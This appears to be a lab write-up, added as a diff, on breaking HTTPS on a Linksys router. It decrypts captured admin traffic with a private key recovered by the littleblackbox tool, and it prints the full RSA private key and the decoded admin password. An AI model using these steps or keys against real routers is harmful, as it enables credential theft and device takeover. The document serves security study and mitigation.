@@ -1,0 +1,30 @@
+=== 7030 Linksys SSL Break
+
+
+Problem: Many routers that provide an HTTPS administrative interface use default or hard-coded SSL keys that can be recovered by extracting the file system from the device's firmware.
+
+The LittleBlackBox project contains a database of over 2,000 (and growing) private SSL keys that are correlated with their respective public certificates, and hardware/firmware versions. While most of these certificates are from DD-WRT firmware, there are also private keys from other vendors including Cisco, Linksys, D-Link and Netgear.
+
+Mitigation: Force to change default SSL keys. Change hardcoded mechanism to put ssl passwords.
+
+1. We use the littleblackbox tool to obtain private key and a way to decipher SSL pcap traffic obtaining username:password in (b64) cleartext. We have passed two arguments to the tool, 1. the capture file, 2 the fingerprint. This tool has a db to compare.
+
+hacker@lcd596:~/littleblackbox-0.1.3/bin$ ./littleblackbox -c /home/hacker/ssl_7030.pcap -f /home/hacker/linksys.fingerprint > /home/hacker/linksys.pem
+-----BEGIN RSA PRIVATE KEY-----
+MIIBOgIBAAJBALy3iYBtUiBdJT9HGogbiv9jRIV9qDySV/VREpdHjpFZ+ClJANlZ
+XajQU9eF9Np33XxM+w9QSxNMvwkRSOSV9IkCAwEAAQJAfanZreMd5N8hhllamXd9
+v0HixuE9vdfVKk2qC4JitPYHReAgpR4gGWiE917PLWoL1701rXbqlEkGcplePHm9
+YQIhAN153pKg1TM6nIm4dNym4SI4ViAfyanbn3ESedgUNlIPAiEA2iJldvc+ofZj
+SqlkfyPQNnHa5oLzgXlzbK5GP3T0h+cCIQC5vgKHMHF9dFNiQRtpDl/TpjG84Uvs
+s28lklwzdsgTywIgTVUYZ56rw7uX4+Y9zJ0jucmPc11FesdV1lfKa8DI2E0CICZZ
+wecsBOdY0s2uJn+SXm14f5/Ipysx2WFbaDCqcb/D
+-----END RSA PRIVATE KEY-----
+
+2. Open wireshark and edit in the preferences 'Protocols' -> 'SSL'
+Add RSA key List section: 192.168.200.242,443,http,/home/hacker/linksys.pem
+
+We add our private key generate as a pem with this format: ip,port,protocol, cert
+
+3. Instantly we can view decipher SSL traffic and obtain our key in the HTTP conversation that gave us the access to the router: OjEzMzdwYXNzd29yZA== in base64 decodes as:
+
+[blank_username]:1337password
